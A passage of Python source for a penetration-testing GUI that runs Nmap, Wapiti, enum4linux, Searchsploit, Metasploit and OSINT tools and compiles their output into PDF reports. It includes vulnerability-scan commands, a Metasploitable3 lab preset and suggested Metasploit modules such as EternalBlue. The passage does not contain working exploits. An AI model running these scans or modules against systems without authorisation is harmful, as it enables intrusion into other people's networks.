        doc = SimpleDocTemplate(str(output_file), pagesize=letter,
                                rightMargin=50, leftMargin=50,
                                topMargin=50, bottomMargin=30)

        story = []

        # Title Page
        story.append(Paragraph("COMPREHENSIVE SECURITY ASSESSMENT REPORT", self.styles['CustomTitle']))
        story.append(Spacer(1, 12))
        story.append(Paragraph(f"Target: {target_ip or 'Unknown'}", self.styles['Normal']))
        story.append(Paragraph(f"Generated: {datetime.now().strftime('%B %d, %Y at %H:%M:%S')}",
                               self.styles['Normal']))
        story.append(Paragraph(f"Scan Command: {nmap_command}", self.styles['Normal']))
        story.append(Spacer(1, 30))

        # Direct raw output sections for all tools
        story.append(Paragraph("ALL TOOL OUTPUTS - RAW RESULTS", self.styles['SectionHeader']))
        story.append(Paragraph(
            "This report contains the complete, unmodified output from all security scanning tools. "
            "Each section below presents the raw data exactly as produced by the respective tool.",
            self.styles['Normal']
        ))
        story.append(Spacer(1, 20))

        # Append all raw tool outputs directly
        self._append_raw_output_sections(story)

        # Build PDF
        doc.build(story)
        logger.info(f"PDF report generated: {output_file}")
        return str(output_file)

    def _generate_executive_summary(self, nmap_command: str) -> str:
        """Generate executive summary."""
        nmap_results = self.scan_results.get_tool_result('nmap')
        total_hosts = len(nmap_results.get('hosts', [])) if nmap_results else 0
        total_ports = sum(len(h.get('ports', [])) for h in nmap_results.get('hosts', [])) if nmap_results else 0
        target_ip = self.target_ip or 'Unknown'

        wapiti_results = self.scan_results.get_tool_result('wapiti')
        total_vulns = wapiti_results.get('total_vulnerabilities', 0) if wapiti_results else 0

        summary = f"""
        This security assessment was conducted using automated reconnaissance and vulnerability scanning tools.
        The scan targeted systems based on the command: <b>{nmap_command}</b>
        <br/><br/>
        <b>Key Findings:</b><br/>
        • Primary Target: {target_ip}<br/>
        • Hosts Scanned: {total_hosts}<br/>
        • Open Ports Discovered: {total_ports}<br/>
        • Web Vulnerabilities Found: {total_vulns}<br/>
        • Tools Used: Nmap, Searchsploit, Wapiti, Enum4linux, Metasploit
        """
        return summary

    def _generate_nmap_section(self, results: dict) -> list:
        """Generate Nmap results section."""
        elements = []

        for host in results.get('hosts', []):
            ip = host.get('ip', 'Unknown')
            elements.append(Paragraph(f"<b>Target: {ip}</b>", self.styles['Normal']))
            elements.append(Spacer(1, 6))

            if host.get('ports'):
                data = [['Port', 'State', 'Service', 'Version']]
                for port in host['ports']:
                    data.append([
                        str(port.get('port', '')),
                        port.get('state', ''),
                        port.get('service', ''),
                        port.get('version', '')
                    ])

                table = Table(data, colWidths=[1*inch, 1*inch, 1.5*inch, 3*inch])
                table.setStyle(TableStyle([
                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#283593')),
                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                    ('FONTSIZE', (0, 0), (-1, 0), 12),
                    ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                    ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                    ('GRID', (0, 0), (-1, -1), 1, colors.black)
                ]))
                elements.append(table)
                elements.append(Spacer(1, 12))

        return elements

    def _generate_searchsploit_section(self, results: dict) -> list:
        """Generate Searchsploit results section."""
        elements = []

        if results.get('exploits'):
            data = [['Exploit Title', 'Path', 'Type']]
            for exploit in results['exploits'][:15]:  # Top 15
                data.append([
                    exploit.get('title', '')[:50],
                    exploit.get('path', '')[:40],
                    exploit.get('type', '')
                ])

            table = Table(data, colWidths=[3*inch, 2.5*inch, 1*inch])
            table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#c62828')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 9),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.lightgrey),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            elements.append(table)
        else:
            elements.append(Paragraph("No exploits found in database.", self.styles['Normal']))

        return elements

    def _generate_nikto_section(self, results: dict) -> list:
        """Generate Nikto results section."""
        elements = []

        total_vulns = results.get('total_vulnerabilities', 0)
        elements.append(Paragraph(f"<b>Total Issues Found: {total_vulns}</b>", self.styles['Normal']))
        elements.append(Spacer(1, 12))

        if results.get('vulnerabilities'):
            for vuln in results['vulnerabilities'][:20]:  # Top 20
                severity = vuln.get('severity', 'low').lower()
                style = self.styles['VulnHigh'] if 'high' in severity else \
                        self.styles['VulnMedium'] if 'medium' in severity else \
                        self.styles['VulnLow']

                elements.append(Paragraph(f"• [{vuln.get('severity', 'N/A').upper()}] {vuln.get('message', 'N/A')}", style))
                elements.append(Spacer(1, 6))

        return elements

    def _generate_wapiti_section(self, results: dict) -> list:
        """Generate Wapiti results section."""
        elements = []

        total_vulns = results.get('total_vulnerabilities', 0)
        elements.append(Paragraph(f"<b>Total Vulnerabilities: {total_vulns}</b>", self.styles['Normal']))
        elements.append(Spacer(1, 12))

        if results.get('vulnerabilities'):
            # Group by category
            by_category = {}
            for vuln in results['vulnerabilities']:
                cat = vuln.get('category', 'Other')
                if cat not in by_category:
                    by_category[cat] = []
                by_category[cat].append(vuln)

            for category, vulns in by_category.items():
                elements.append(Paragraph(f"<b>{category} ({len(vulns)})</b>", self.styles['Normal']))
                elements.append(Spacer(1, 6))

                for vuln in vulns[:10]:  # Top 10 per category
                    level = vuln.get('level', 1)
                    style = self.styles['VulnHigh'] if level >= 2 else self.styles['VulnLow']

                    url = vuln.get('url', 'N/A')
                    param = vuln.get('parameter', '')
                    desc = f"{url}"
                    if param:
                        desc += f" (Parameter: {param})"

                    elements.append(Paragraph(f"  • {desc}", style))
                    elements.append(Spacer(1, 4))

                elements.append(Spacer(1, 12))

        return elements

    def _generate_enum4linux_section(self, results: dict) -> list:
        """Generate Enum4linux results section."""
        elements = []

        if results.get('users'):
            elements.append(Paragraph(f"<b>Users Found: {len(results['users'])}</b>", self.styles['Normal']))
            for user in results['users'][:10]:
                elements.append(Paragraph(f"  • {user.get('username', 'N/A')}", self.styles['Normal']))
            elements.append(Spacer(1, 12))

        if results.get('shares'):
            elements.append(Paragraph(f"<b>Shares Found: {len(results['shares'])}</b>", self.styles['Normal']))
            for share in results['shares'][:10]:
                elements.append(Paragraph(f"  • {share.get('name', 'N/A')} ({share.get('type', 'N/A')})",
                                         self.styles['Normal']))
            elements.append(Spacer(1, 12))

        return elements

    def _generate_metasploit_section(self, results: dict) -> list:
        """Generate Metasploit section."""
        elements = []
        metasploit_paths = self.raw_outputs.get('Metasploit Output', [])
        normalized_paths = self._normalize_paths(metasploit_paths)

        existing_file = next((path for path in normalized_paths if path.exists()), None)

        if existing_file:
            elements.append(Paragraph(
                f"Metasploit suggestions have been generated. See: {existing_file.name}",
                self.styles['Normal']
            ))
            elements.append(Spacer(1, 8))
            elements.append(Paragraph("<b>Key Modules to Consider:</b>", self.styles['Normal']))
            elements.append(Paragraph("• exploit/windows/smb/ms17_010_eternalblue", self.styles['Normal']))
            elements.append(Paragraph("• auxiliary/scanner/smb/smb_login", self.styles['Normal']))
            elements.append(Paragraph("• auxiliary/scanner/ssh/ssh_login", self.styles['Normal']))
        elif normalized_paths:
            elements.append(Paragraph(
                "Metasploit output files were generated but could not be located.",
                self.styles['Normal']
            ))
        else:
            elements.append(Paragraph("No Metasploit suggestions available.", self.styles['Normal']))

        return elements

    def _generate_recommendations(self) -> list:
        """Generate security recommendations."""
        elements = []

        recommendations = [
            ("Patch Management", "Ensure all systems are updated with the latest security patches."),
            ("Service Hardening", "Disable unnecessary services and close unused ports."),
            ("Access Controls", "Implement strong authentication and authorization mechanisms."),
            ("Encryption", "Use encrypted protocols (HTTPS, SSH, FTPS) instead of plaintext alternatives."),
            ("Monitoring", "Deploy intrusion detection systems and log monitoring solutions."),
            ("Penetration Testing", "Conduct regular security assessments and penetration tests."),
        ]

        for title, desc in recommendations:
            elements.append(Paragraph(f"<b>{title}:</b> {desc}", self.styles['Normal']))
            elements.append(Spacer(1, 8))

        return elements

    def _normalize_paths(self, path_candidates: Iterable[Optional[Path]]) -> List[Path]:
        """Normalize iterable of path candidates into unique Path objects."""
        normalized: List[Path] = []
        if not path_candidates:
            return normalized

        for candidate in path_candidates:
            if not candidate:
                continue
            path_obj = Path(candidate)
            if path_obj not in normalized:
                normalized.append(path_obj)

        return normalized

    def _append_raw_output_sections(self, story: List[Any]) -> None:
        """Append raw tool output sections to the PDF story."""
        if not self.raw_outputs:
            story.append(Paragraph("No tool outputs available.", self.styles['Normal']))
            return

        # Process each tool's output
        for title, paths in self.raw_outputs.items():
            story.append(PageBreak())
            story.append(Paragraph(title, self.styles['SectionHeader']))
            normalized_paths = self._normalize_paths(paths)

            if not normalized_paths:
                story.append(Paragraph("No output files were generated for this tool.", self.styles['Normal']))
                story.append(Spacer(1, 12))
                continue

            for path in normalized_paths:
                # Add file reference
                story.append(Paragraph(f"<b>File:</b> {path.name}", self.styles['Normal']))
                story.append(Paragraph(f"<i>Location:</i> {path}", self.styles['Normal']))
                story.append(Spacer(1, 8))

                if path.exists():
                    try:
                        content = path.read_text(encoding='utf-8', errors='replace')
                        if content.strip():
                            # Split very long content into chunks to avoid PDF rendering issues
                            max_chunk_size = 50000  # ~50KB per chunk
                            if len(content) > max_chunk_size:
                                chunks = [content[i:i+max_chunk_size] for i in range(0, len(content), max_chunk_size)]
                                for idx, chunk in enumerate(chunks):
                                    if idx > 0:
                                        story.append(Paragraph(f"<i>... continued (part {idx+1}/{len(chunks)})</i>",
                                                             self.styles['Normal']))
                                    story.append(Preformatted(chunk, self.styles['RawOutput']))
                            else:
                                story.append(Preformatted(content, self.styles['RawOutput']))
                        else:
                            story.append(Paragraph("<i>Output file is empty.</i>", self.styles['Normal']))
                    except Exception as exc:
                        story.append(Paragraph(f"<i>Unable to read file: {exc}</i>", self.styles['Normal']))
                else:
                    story.append(Paragraph("<i>File not found.</i>", self.styles['Normal']))

                story.append(Spacer(1, 20))

# =============================================================================
# GUI INTERFACE
# =============================================================================

class SecurityOrchestratorGUI:
    """Main GUI application for Security Orchestrator."""

    def __init__(self, root):
        self.root = root
        self.root.title(config.get('app.window_title'))
        self.root.geometry(f"{config.get('app.window_width')}x{config.get('app.window_height')}")

        # Initialize orchestrator
        self.orchestrator = Orchestrator()
        self.scan_thread = None
        self.scan_running = False

        # Queue for pentest automation inter-thread communication
        self.pentest_queue = queue.Queue()

        # Storage for pentest results
        self.pentest_results = {}
        self.auto_enumerator = None
        self.external_enumerator = None

        # Create GUI elements
        self._create_widgets()

        # Check tool availability
        self._check_tools()

        # Start queue processor for pentest automation
        self._process_pentest_queue()

    def _create_widgets(self):
        """Create all GUI widgets with tabbed interface."""
        # Main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Create notebook (tabbed interface)
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Tab 1: Original Security Orchestrator
        self.main_tab = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.main_tab, text="Main Scanner")
        self._create_main_scanner_tab(self.main_tab)

        # Tab 2: Automated Internal Enumeration
        self.auto_enum_tab = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.auto_enum_tab, text="Automated Enumeration")
        self._create_automated_enum_tab(self.auto_enum_tab)

        # Tab 3: External OSINT
        self.osint_tab = ttk.Frame(self.notebook, padding="10")
        self.notebook.add(self.osint_tab, text="External OSINT")
        self._create_osint_tab(self.osint_tab)

        # Status bar at bottom
        self.status_bar = ttk.Label(self.root, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def _create_main_scanner_tab(self, parent):
        """Create the original main scanner tab."""
        # Main frame
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Configure grid weights
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(8, weight=1)

        # Title
        title_label = ttk.Label(main_frame, text="Security Orchestrator",
                               font=("Arial", 16, "bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 10))

        # Nmap Command Input
        ttk.Label(main_frame, text="Nmap Command:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.nmap_text = tk.Text(main_frame, height=3, width=80, wrap=tk.WORD)
        self.nmap_text.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=2)
        self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000 192.168.1.100")

        # Port Scan Options
        port_scan_frame = ttk.LabelFrame(main_frame, text="Port Scan Options", padding="5")
        port_scan_frame.grid(row=3, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=5)

        self.port_scan_type = tk.StringVar(value="top1000")
        ttk.Radiobutton(port_scan_frame, text="Top 1000 Ports (Fast - 5-10 min)",
                       variable=self.port_scan_type, value="top1000",
                       command=self._update_nmap_command).grid(row=0, column=0, sticky=tk.W, padx=10)
        ttk.Radiobutton(port_scan_frame, text="All 65535 Ports (Thorough - 30-60+ min)",
                       variable=self.port_scan_type, value="allports",
                       command=self._update_nmap_command).grid(row=0, column=1, sticky=tk.W, padx=10)
        ttk.Radiobutton(port_scan_frame, text="Custom (Edit command manually)",
                       variable=self.port_scan_type, value="custom",
                       command=self._update_nmap_command).grid(row=0, column=2, sticky=tk.W, padx=10)

        # Target IP Input with presets
        target_frame = ttk.Frame(main_frame)
        target_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=2)

        ttk.Label(target_frame, text="Target IP/Range (optional):").grid(row=0, column=0, sticky=tk.W)
        self.target_entry = ttk.Entry(target_frame, width=30)
        self.target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(5, 0))
        self.target_entry.bind("<KeyRelease>", lambda e: self._update_nmap_command())

        ttk.Label(target_frame, text="Quick Presets:").grid(row=0, column=2, sticky=tk.W, padx=(10, 0))
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(target_frame, textvariable=self.preset_var,
                                        values=["", "Metasploitable3 (192.168.1.100)", "Localhost (127.0.0.1)", "Custom"],
                                        state="readonly", width=25)
        self.preset_combo.grid(row=0, column=3, sticky=tk.W, padx=(5, 0))
        self.preset_combo.bind("<<ComboboxSelected>>", self._on_preset_selected)

        # Output Directory
        ttk.Label(main_frame, text="Output Directory:").grid(row=5, column=0, sticky=tk.W, pady=2)
        self.output_frame = ttk.Frame(main_frame)
        self.output_frame.grid(row=5, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=2)
        self.output_entry = ttk.Entry(self.output_frame, width=40)
        self.output_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        # Use absolute path from config
        default_results_dir = str(config.get_results_dir())
        self.output_entry.insert(0, default_results_dir)
        ttk.Button(self.output_frame, text="Browse", command=self._browse_output_dir).pack(side=tk.RIGHT, padx=(5, 0))

        # Control Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=6, column=0, columnspan=3, pady=10)

        self.scan_button = ttk.Button(button_frame, text="Run Comprehensive Scan",
                                    command=self._start_scan, state=tk.DISABLED)
        self.scan_button.pack(side=tk.LEFT, padx=(0, 10))

        self.export_button = ttk.Button(button_frame, text="Export Report",
                                      command=self._export_report, state=tk.DISABLED)
        self.export_button.pack(side=tk.LEFT)

        self.view_requests_button = ttk.Button(button_frame, text="View Captured Requests",
                                          command=self._view_captured_requests, state=tk.DISABLED)
        self.view_requests_button.pack(side=tk.LEFT, padx=(10, 0))

        # Progress and Status
        ttk.Label(main_frame, text="Status:").grid(row=7, column=0, sticky=tk.W, pady=2)
        self.status_label = ttk.Label(main_frame, text="Ready", foreground="blue")
        self.status_label.grid(row=7, column=1, sticky=tk.W, pady=2)

        self.progress = ttk.Progressbar(main_frame, orient="horizontal", length=400, mode="determinate")
        self.progress.grid(row=7, column=2, sticky=(tk.W, tk.E), pady=2)

        # Output Console
        ttk.Label(main_frame, text="Output Console:").grid(row=8, column=0, sticky=tk.W, pady=2)
        self.output_text = scrolledtext.ScrolledText(main_frame, height=20, width=80, wrap=tk.WORD)
        self.output_text.grid(row=9, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=2)

        # Tool status frame
        tools_frame = ttk.LabelFrame(main_frame, text="Tool Availability", padding="5")
        tools_frame.grid(row=10, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)

        self.tool_labels = {}
        tools = ['nmap', 'searchsploit', 'enum4linux', 'wapiti', 'nuclei', 'msfconsole']
        for i, tool in enumerate(tools):
            ttk.Label(tools_frame, text=f"{tool.replace('_', ' ').title()}:").grid(row=0, column=i*2, sticky=tk.W, padx=5)
            self.tool_labels[tool] = ttk.Label(tools_frame, text="Checking...", foreground="orange")
            self.tool_labels[tool].grid(row=0, column=i*2+1, sticky=tk.W, padx=5)

    def _create_automated_enum_tab(self, parent):
        """Create automated enumeration tab (based on Automate_Enum.sh)"""
        # Title and description
        title_label = ttk.Label(parent, text="Automated Internal Enumeration",
                               font=("Arial", 14, "bold"))
        title_label.pack(pady=(0, 5))

        desc_text = """Comprehensive automated enumeration similar to Automate_Enum.sh from Pentest-Scripts.
Performs Nmap scans, web enumeration (Nikto, WhatWeb, Gobuster), SMB scanning, and visual reconnaissance.
Results organized in structured folders for each tool."""
        desc_label = ttk.Label(parent, text=desc_text, justify=tk.LEFT, foreground="gray", wraplength=900)
        desc_label.pack(pady=(0, 10))

        # Input frame
        input_frame = ttk.LabelFrame(parent, text="Target Configuration", padding="10")
        input_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(input_frame, text="Target IP/Range:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.auto_target_entry = ttk.Entry(input_frame, width=40)
        self.auto_target_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        self.auto_target_entry.insert(0, "192.168.1.100")

        ttk.Label(input_frame, text="Output Directory:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.auto_output_entry = ttk.Entry(input_frame, width=40)
        self.auto_output_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        self.auto_output_entry.insert(0, str(Path.home() / "Desktop"))
        ttk.Button(input_frame, text="Browse", command=self._browse_auto_output).grid(row=1, column=2, padx=(5, 0))

        input_frame.columnconfigure(1, weight=1)

        # Port Scan Options (shared with Main Scanner)
        port_scan_frame = ttk.LabelFrame(parent, text="Nmap Port Scan Options", padding="10")
        port_scan_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(port_scan_frame, text="Select port scanning mode:",
                 font=("Arial", 9, "bold")).grid(row=0, column=0, columnspan=3, sticky=tk.W, pady=(0, 5))

        ttk.Radiobutton(port_scan_frame, text="⚡ Top 1000 Ports (Fast - 5-10 min)",
                       variable=self.port_scan_type, value="top1000").grid(row=1, column=0, sticky=tk.W, padx=10, pady=2)
        ttk.Radiobutton(port_scan_frame, text="🔍 All 65535 Ports (Thorough - 30-60+ min)",
                       variable=self.port_scan_type, value="allports").grid(row=1, column=1, sticky=tk.W, padx=10, pady=2)

        ttk.Label(port_scan_frame, text="Note: This applies to all Nmap scans in both tabs",
                 foreground="gray", font=("Arial", 8, "italic")).grid(row=2, column=0, columnspan=3, sticky=tk.W, pady=(5, 0))

        # Tool selection frame
        tools_frame = ttk.LabelFrame(parent, text="Enumeration Modules", padding="10")
        tools_frame.pack(fill=tk.X, pady=(0, 10))

        self.auto_tool_vars = {}
        auto_tools = [
            ('nmap_discovery', 'Nmap Discovery (DNS + Ports + Vuln)', True),
            ('web_enum', 'Web Enumeration (Nikto, WhatWeb, Gobuster)', True),
            ('smb_enum', 'SMB Enumeration (enum4linux)', True),
            ('eyewitness', 'Visual Reconnaissance (EyeWitness)', False)
        ]

        for i, (key, label, default) in enumerate(auto_tools):
            var = tk.BooleanVar(value=default)
            self.auto_tool_vars[key] = var
            cb = ttk.Checkbutton(tools_frame, text=label, variable=var)
            cb.grid(row=i//2, column=i%2, sticky=tk.W, padx=10, pady=2)

        # Control buttons
        button_frame = ttk.Frame(parent)
        button_frame.pack(fill=tk.X, pady=(0, 10))

        self.auto_scan_button = ttk.Button(button_frame, text="Start Automated Enumeration",
                                          command=self._start_auto_enum)
        self.auto_scan_button.pack(side=tk.LEFT, padx=(0, 5))

        self.auto_stop_button = ttk.Button(button_frame, text="Stop",
                                          command=self._stop_auto_enum, state=tk.DISABLED)
        self.auto_stop_button.pack(side=tk.LEFT)

        self.auto_progress = ttk.Progressbar(button_frame, mode='indeterminate', length=200)
        self.auto_progress.pack(side=tk.RIGHT)

        # Output console
        ttk.Label(parent, text="Scan Output:").pack(anchor=tk.W)
        self.auto_output_text = scrolledtext.ScrolledText(parent, height=20, width=80, wrap=tk.WORD)
        self.auto_output_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))

    def _create_osint_tab(self, parent):
        """Create external OSINT tab (based on External_Enum.sh)"""
        # Title and description
        title_label = ttk.Label(parent, text="External OSINT & Domain Enumeration",
                               font=("Arial", 14, "bold"))
        title_label.pack(pady=(0, 5))

        desc_text = """External reconnaissance similar to External_Enum.sh from Pentest-Scripts.
Performs WHOIS lookups, DNS enumeration, subdomain discovery, and email harvesting."""
        desc_label = ttk.Label(parent, text=desc_text, justify=tk.LEFT, foreground="gray", wraplength=900)
        desc_label.pack(pady=(0, 10))

        # Input frame
        input_frame = ttk.LabelFrame(parent, text="Target Configuration", padding="10")
        input_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(input_frame, text="Target Domain:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.osint_domain_entry = ttk.Entry(input_frame, width=40)
        self.osint_domain_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        self.osint_domain_entry.insert(0, "example.com")

        ttk.Label(input_frame, text="Output Directory:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.osint_output_entry = ttk.Entry(input_frame, width=40)
        self.osint_output_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=(5, 0))
        self.osint_output_entry.insert(0, str(Path.home() / "Desktop"))
        ttk.Button(input_frame, text="Browse", command=self._browse_osint_output).grid(row=1, column=2, padx=(5, 0))

        input_frame.columnconfigure(1, weight=1)

        # Tool selection frame
        tools_frame = ttk.LabelFrame(parent, text="OSINT Modules", padding="10")
        tools_frame.pack(fill=tk.X, pady=(0, 10))

        self.osint_tool_vars = {}
        osint_tools = [
            ('whois', 'WHOIS Lookup', True),
            ('theharvester', 'theHarvester (Email/Subdomain)', True),
            ('dnsrecon', 'DNSRecon', True),
            ('sublist3r', 'Sublist3r (Subdomain Enum)', True)
        ]

        for i, (key, label, default) in enumerate(osint_tools):
            var = tk.BooleanVar(value=default)
            self.osint_tool_vars[key] = var
            cb = ttk.Checkbutton(tools_frame, text=label, variable=var)
            cb.grid(row=i//2, column=i%2, sticky=tk.W, padx=10, pady=2)

        # Control buttons
        button_frame = ttk.Frame(parent)
        button_frame.pack(fill=tk.X, pady=(0, 10))

        self.osint_scan_button = ttk.Button(button_frame, text="Start OSINT Enumeration",
                                           command=self._start_osint)
        self.osint_scan_button.pack(side=tk.LEFT, padx=(0, 5))

        self.osint_stop_button = ttk.Button(button_frame, text="Stop",
                                           command=self._stop_osint, state=tk.DISABLED)
        self.osint_stop_button.pack(side=tk.LEFT)

        self.osint_progress = ttk.Progressbar(button_frame, mode='indeterminate', length=200)
        self.osint_progress.pack(side=tk.RIGHT)

        # Output console
        ttk.Label(parent, text="OSINT Output:").pack(anchor=tk.W)
        self.osint_output_text = scrolledtext.ScrolledText(parent, height=20, width=80, wrap=tk.WORD)
        self.osint_output_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))

    def _check_tools(self):
        """Check availability of all security tools."""
        def check_tool(tool_name):
            wrapper_map = {
                'nmap': self.orchestrator.nmap_wrapper,
                'searchsploit': self.orchestrator.searchsploit_wrapper,
                'enum4linux': self.orchestrator.enum4linux_wrapper,
                'wapiti': self.orchestrator.wapiti_wrapper,
                'nuclei': self.orchestrator.nuclei_wrapper,
                'msfconsole': self.orchestrator.metasploit_wrapper
            }
            if tool_name in wrapper_map:
                available = wrapper_map[tool_name].check_availability()
                status = "✓ Available" if available else "✗ Not Found"
                color = "green" if available else "red"
                self._update_tool_status(tool_name, status, color)


        # Check tools in background
        for tool in ["nmap", "searchsploit", "enum4linux", "wapiti", "msfconsole", "hydra", "sqlmap", "gobuster"]:
            thread = threading.Thread(target=check_tool, args=(tool,), daemon=True)
            thread.start()

    def _update_tool_status(self, tool_name, status, color):
        """Update tool availability status in GUI."""
        if tool_name in self.tool_labels:
            self.tool_labels[tool_name].config(text=status, foreground=color)

        # Enable scan button if nmap is available (minimum requirement)
        if tool_name == 'nmap' and status == "✓ Available":
            self.scan_button.config(state=tk.NORMAL)

    def _on_preset_selected(self, event):
        """Handle preset selection."""
        preset = self.preset_var.get()
        if preset == "Metasploitable3 (192.168.1.100)":
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "192.168.1.100")
            self.port_scan_type.set("custom")  # User can customize
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000,3306,3389,445,80,443,8080 --script vuln 192.168.1.100")
        elif preset == "Localhost (127.0.0.1)":
            self.target_entry.delete(0, tk.END)
            self.target_entry.insert(0, "127.0.0.1")
            self._update_nmap_command()
        elif preset == "Custom":
            self.target_entry.delete(0, tk.END)
            self.nmap_text.delete("1.0", tk.END)
            self.nmap_text.insert(tk.END, "nmap -sV -p 1-1000 ")

    def _update_nmap_command(self):
        """Update nmap command based on port scan selection and target."""
        if self.port_scan_type.get() == "custom":
            return  # Don't auto-update if user wants custom

        target = self.target_entry.get().strip() or "192.168.1.100"
        scan_type = self.port_scan_type.get()

        if scan_type == "top1000":
            command = f"nmap -sV -sC -T4 --top-ports 1000 {target}"
        elif scan_type == "allports":
            command = f"nmap -sV -sC -T4 -p- {target}"
        else:
            return

        self.nmap_text.delete("1.0", tk.END)
        self.nmap_text.insert(tk.END, command)

    def _browse_output_dir(self):
        """Browse for output directory."""
        dir_path = filedialog.askdirectory(initialdir=self.output_entry.get())
        if dir_path:
            self.output_entry.delete(0, tk.END)
            self.output_entry.insert(0, dir_path)

    def _start_scan(self):
        """Start the comprehensive security scan."""
        if self.scan_running:
            return

        nmap_command = self.nmap_text.get("1.0", tk.END).strip()
        if not nmap_command:
            messagebox.showerror("Error", "Please enter an Nmap command")
            return

        target_ip = self.target_entry.get().strip() or None
        output_dir = self.output_entry.get().strip()

        # Update orchestrator with new output directory
        self.orchestrator = Orchestrator(Path(output_dir))

        # Clear output console
        self.output_text.delete("1.0", tk.END)

        # Update UI
        self.scan_button.config(state=tk.DISABLED)
        self.progress['value'] = 0
        self.status_label.config(text="Starting scan...", foreground="blue")

        # Start scan in background thread
        self.scan_running = True
        self.scan_thread = threading.Thread(target=self._run_scan_worker,
                                          args=(nmap_command, target_ip),
                                          daemon=True)
        self.scan_thread.start()

    def _run_scan_worker(self, nmap_command, target_ip):
        """Worker function to run the scan in background."""
        try:
            def progress_callback(message):
                self.root.after(0, lambda: self._update_progress(message))

            success, message = self.orchestrator.run_comprehensive_scan(
                nmap_command, target_ip, progress_callback
            )

            self.root.after(0, lambda: self._scan_completed(success, message))

        except Exception as e:
            self.root.after(0, lambda: self._scan_completed(False, f"Scan error: {str(e)}"))

    def _update_progress(self, message):
        """Update progress display."""
        self.output_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
        self.output_text.see(tk.END)
        self.status_label.config(text=message, foreground="blue")

        # Update progress bar based on message content
        if "Starting" in message:
            self.progress['value'] = 10
        elif "Nmap" in message and "completed" in message:
            self.progress['value'] = 15
        elif "Exploit Database" in message and "completed" in message:
            self.progress['value'] = 30
        elif "SMB Enumeration" in message and "completed" in message:
            self.progress['value'] = 45
        elif "Web Application" in message and "completed" in message:
            self.progress['value'] = 60
        elif "Nuclei" in message and "completed" in message:
            self.progress['value'] = 80
        elif "Metasploit" in message and "completed" in message:
            self.progress['value'] = 100

    def _scan_completed(self, success, message):
        """Handle scan completion."""
        self.scan_running = False
        self.scan_button.config(state=tk.NORMAL)
        self.export_button.config(state=tk.NORMAL)
        self.view_requests_button.config(state=tk.NORMAL)

        color = "green" if success else "red"
        self.status_label.config(text="Scan completed", foreground=color)
        self.progress['value'] = 100

        self.output_text.insert(tk.END, f"\n{'='*50}\n")
        self.output_text.insert(tk.END, f"SCAN RESULT: {'SUCCESS' if success else 'FAILED'}\n")
        self.output_text.insert(tk.END, f"{message}\n")
        self.output_text.insert(tk.END, f"{'='*50}\n")
        self.output_text.see(tk.END)

        # Display final report in console
        report_file = self.orchestrator.results_dir / "final_report.txt"
        if report_file.exists():
            try:
                with open(report_file, 'r', encoding='utf-8') as f:
                    report_content = f.read()
                self.output_text.insert(tk.END, f"\n{'='*80}\nFINAL REPORT:\n{'='*80}\n")
                self.output_text.insert(tk.END, report_content)
                self.output_text.see(tk.END)
            except Exception as e:
                self.output_text.insert(tk.END, f"Error loading report: {e}\n")

    def _export_report(self):
        """Export the final report to a user-selected location."""
        report_file = self.orchestrator.results_dir / "final_report.txt"
        if not report_file.exists():
            messagebox.showerror("Error", "No report available to export")
            return

        save_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
